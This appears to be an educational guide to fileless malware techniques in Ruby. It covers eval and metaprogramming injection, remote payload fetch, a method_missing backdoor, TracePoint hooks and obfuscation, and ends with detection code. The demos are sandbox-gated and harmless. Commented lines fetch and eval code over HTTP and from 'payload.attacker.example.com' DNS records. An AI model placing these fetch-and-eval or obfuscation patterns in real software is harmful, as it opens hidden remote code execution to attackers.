# Fileless Payload Techniques in Ruby

> **EDUCATIONAL MATERIAL - For authorized security research only**
> These techniques are documented to help defenders understand and detect fileless attacks.

## Overview

Fileless malware operates entirely in memory, leaving minimal forensic artifacts on disk.
Ruby's dynamic nature and powerful metaprogramming capabilities make it particularly
amenable to fileless techniques. Understanding these techniques is essential for building
effective detection mechanisms.

## 1. In-Memory Code Execution

### 1.1 eval-Based Execution

```ruby
# EDUCATIONAL ONLY - Demonstrates eval-based fileless execution
# The most basic fileless technique: fetching and evaluating code from a remote source

module FilelessDemo
  # WARNING: This is an educational demonstration only
  SANDBOX_CHECK = ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

  def self.demonstrate_eval_payload
    raise "Must run in sandbox" unless SANDBOX_CHECK

    # Educational: In a real attack, this would fetch from a C2 server
    # The payload never touches disk - it exists only in memory
    simulated_payload = <<~RUBY
      $stderr.puts "[EDUCATIONAL] Fileless payload executed in memory"
      $stderr.puts "[EDUCATIONAL] PID: \#{Process.pid}, Time: \#{Time.now}"
      { status: 'executed', memory_only: true }
    RUBY

    # eval() executes the string as Ruby code in the current process
    # No file is created on disk
    eval(simulated_payload)
  end
end
```

### 1.2 instance_eval and class_eval

```ruby
# EDUCATIONAL: Using instance_eval to inject behavior into existing objects
module FilelessDemo
  def self.demonstrate_instance_eval
    raise "Must run in sandbox" unless ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

    target_object = Object.new

    # instance_eval adds methods to a specific object instance
    # This modifies behavior without creating new files
    target_object.instance_eval do
      def hidden_method
        "[EDUCATIONAL] Method injected via instance_eval"
      end
    end

    target_object.hidden_method
  end

  def self.demonstrate_class_eval
    raise "Must run in sandbox" unless ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

    # class_eval modifies an existing class at runtime
    # This can add or override methods in any class, including stdlib
    String.class_eval do
      def educational_marker
        "[EDUCATIONAL] Method added to String class at runtime"
      end
    end

    "test".educational_marker
  end
end
```

### 1.3 define_method for Dynamic Method Creation

```ruby
# EDUCATIONAL: Dynamic method definition without source files
module FilelessDemo
  def self.demonstrate_dynamic_methods
    raise "Must run in sandbox" unless ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

    klass = Class.new do
      # Methods defined with define_method exist only in memory
      # They don't appear in any source file
      define_method(:payload_a) do
        "[EDUCATIONAL] Dynamic method A - exists only in memory"
      end

      define_method(:payload_b) do |arg|
        "[EDUCATIONAL] Dynamic method B received: #{arg}"
      end
    end

    obj = klass.new
    [obj.payload_a, obj.payload_b("test_data")]
  end
end
```

## 2. Network-Based Payload Delivery

### 2.1 HTTP-Based Payload Fetch

```ruby
# EDUCATIONAL: Fetching and executing code from a remote server
require 'net/http'
require 'uri'

module FilelessDemo
  def self.demonstrate_remote_payload
    raise "Must run in sandbox" unless ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

    # Educational: In a real attack, this fetches code from a C2 server
    # The code is evaluated in memory without being saved to disk
    #
    # Simulated flow (not actually connecting):
    # uri = URI.parse("http://127.0.0.1:4567/payload")
    # response = Net::HTTP.get_response(uri)
    # eval(response.body) if response.code == '200'

    $stderr.puts "[EDUCATIONAL] Remote payload fetch demonstrated (simulated)"
    { status: 'simulated', technique: 'http_fetch_eval' }
  end
end
```

### 2.2 DNS-Based Payload Delivery

```ruby
# EDUCATIONAL: Using DNS TXT records to deliver small payloads
require 'resolv'

module FilelessDemo
  def self.demonstrate_dns_payload
    raise "Must run in sandbox" unless ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

    # Educational: DNS TXT records can carry small payloads (< 255 bytes per record)
    # Multiple records can be chained for larger payloads
    #
    # Simulated flow (not actually resolving):
    # resolver = Resolv::DNS.new
    # records = resolver.getresources('payload.attacker.example.com', Resolv::DNS::Resource::IN::TXT)
    # payload = records.map(&:data).join
    # eval(Base64.decode64(payload))

    $stderr.puts "[EDUCATIONAL] DNS-based payload delivery demonstrated (simulated)"
    { status: 'simulated', technique: 'dns_txt_eval' }
  end
end
```

## 3. Ruby Metaprogramming for Stealth

### 3.1 method_missing as a Backdoor

```ruby
# EDUCATIONAL: Using method_missing to create a stealthy backdoor
module FilelessDemo
  class StealthProxy
    def initialize
      @activated = false
    end

    # method_missing intercepts calls to undefined methods
    # An attacker can use this to create an invisible command interface
    def method_missing(method_name, *args, &block)
      case method_name
      when :activate_educational_demo
        @activated = true
        "[EDUCATIONAL] Stealth proxy activated"
      when :run_simulated_payload
        return super unless @activated
        "[EDUCATIONAL] Simulated payload executed via method_missing"
      else
        super
      end
    end

    def respond_to_missing?(method_name, include_private = false)
      [:activate_educational_demo, :run_simulated_payload].include?(method_name) || super
    end
  end
end
```

### 3.2 TracePoint for Execution Hooking

```ruby
# EDUCATIONAL: Using TracePoint to hook into method execution
module FilelessDemo
  def self.demonstrate_tracepoint_hook
    raise "Must run in sandbox" unless ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

    intercepted_calls = []

    # TracePoint can intercept any method call in the Ruby process
    # An attacker could use this to:
    # - Intercept credentials passed to authentication methods
    # - Monitor database queries for sensitive data
    # - Hook into HTTP clients to capture API keys
    trace = TracePoint.new(:call) do |tp|
      if tp.method_id == :educational_target_method
        intercepted_calls << {
          method: tp.method_id,
          file: tp.path,
          line: tp.lineno,
          time: Time.now
        }
      end
    end

    trace.enable
    # ... application runs normally, but all target method calls are intercepted
    trace.disable

    intercepted_calls
  end
end
```

### 3.3 Refinements for Scoped Monkey-Patching

```ruby
# EDUCATIONAL: Using refinements to scope malicious modifications
module FilelessDemo
  # Refinements allow scoped modifications to existing classes
  # This makes detection harder because the modifications only apply
  # in specific contexts
  module StealthRefinement
    refine String do
      def to_s
        # Educational: Could intercept string operations to capture data
        original = super
        # In a real attack, sensitive strings could be exfiltrated here
        original
      end
    end
  end
end
```

## 4. Process-Level Techniques

### 4.1 Fork-Based Isolation

```ruby
# EDUCATIONAL: Using fork to isolate malicious operations
module FilelessDemo
  def self.demonstrate_fork_isolation
    raise "Must run in sandbox" unless ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

    # Fork creates a child process that inherits the parent's memory
    # The child can execute payloads independently
    # If the child crashes or is detected, the parent is unaffected
    pid = fork do
      # Child process - educational payload
      $stderr.puts "[EDUCATIONAL] Forked child process #{Process.pid}"
      $stderr.puts "[EDUCATIONAL] Parent process: #{Process.ppid}"
      # Educational: Child could perform reconnaissance, exfiltration, etc.
      exit!(0)  # Exit without running at_exit handlers
    end

    Process.waitpid(pid) if pid
    { parent_pid: Process.pid, child_pid: pid }
  end
end
```

### 4.2 Thread-Based Concurrent Execution

```ruby
# EDUCATIONAL: Background thread for persistent in-memory operations
module FilelessDemo
  def self.demonstrate_background_thread
    raise "Must run in sandbox" unless ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

    # A background thread runs alongside the legitimate application
    # It's harder to detect than a separate process
    thread = Thread.new do
      Thread.current[:educational] = true

      loop do
        # Educational: Periodic beacon or data collection
        $stderr.puts "[EDUCATIONAL] Background thread tick at #{Time.now}"
        sleep 60  # Check in every 60 seconds

        # Break condition for educational demo
        break if Thread.current[:should_stop]
      end
    end

    thread[:should_stop] = true
    thread.join(1)  # Wait max 1 second

    { thread_status: 'demonstrated', technique: 'background_thread' }
  end
end
```

## 5. Encoding and Obfuscation

### 5.1 Base64-Encoded Payloads

```ruby
# EDUCATIONAL: Encoding payloads to evade simple string matching
require 'base64'

module FilelessDemo
  def self.demonstrate_encoded_payload
    raise "Must run in sandbox" unless ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

    # The actual payload is encoded, making it harder to detect via grep/static analysis
    encoded = Base64.encode64(<<~RUBY)
      $stderr.puts "[EDUCATIONAL] Decoded and executed payload"
      { decoded: true, educational: true }
    RUBY

    # At runtime, decode and execute
    eval(Base64.decode64(encoded))
  end
end
```

### 5.2 String Manipulation Obfuscation

```ruby
# EDUCATIONAL: Building payloads from fragments to evade detection
module FilelessDemo
  def self.demonstrate_string_obfuscation
    raise "Must run in sandbox" unless ENV['RUBYGUARDIAN_SANDBOX'] == 'true'

    # These fragments individually don't trigger security scanners
    parts = [
      '$std',      # Fragment 1
      'err.pu',    # Fragment 2
      'ts "[ED',   # Fragment 3
      'UCATIONAL',  # Fragment 4
      '] Obfusc',  # Fragment 5
      'ated"'      # Fragment 6
    ]

    # Reassembled at runtime
    eval(parts.join)
  end
end
```

## 6. Detection Strategies

### 6.1 Monitoring eval Usage

```ruby
# DEFENSIVE: Hook eval to detect fileless execution
module EvalMonitor
  def eval(code, *args)
    caller_info = caller(1, 1).first
    $stderr.puts "[DETECTION] eval() called from: #{caller_info}"
    $stderr.puts "[DETECTION] Code length: #{code.length} bytes"

    # Log to security monitoring system
    # SecurityMonitor.log_eval(caller_info, code.length, code.hash)

    super
  end
end
```

### 6.2 Network Activity Monitoring

```ruby
# DEFENSIVE: Monitor for suspicious network activity
# Watch for:
# - HTTP requests to unknown hosts during gem loading
# - DNS queries for unusual domains
# - Outbound connections on non-standard ports
# - Data exfiltration patterns (large outbound transfers)
```

### 6.3 ObjectSpace Analysis

```ruby
# DEFENSIVE: Use ObjectSpace to detect injected objects
module MemoryAnalysis
  def self.detect_anomalies
    suspicious = []

    ObjectSpace.each_object(Class) do |klass|
      # Look for dynamically defined classes
      if klass.name.nil?
        suspicious << {
          type: 'anonymous_class',
          object_id: klass.object_id,
          methods: klass.instance_methods(false)
        }
      end
    end

    suspicious
  end
end
```

## References

- "Fileless Malware: Attack Trend Exposed" - Trend Micro Research
- "Living off the Land" techniques - MITRE ATT&CK
- Ruby Security Guide - ruby-lang.org
- "Metaprogramming Ruby 2" - Paolo Perrotta
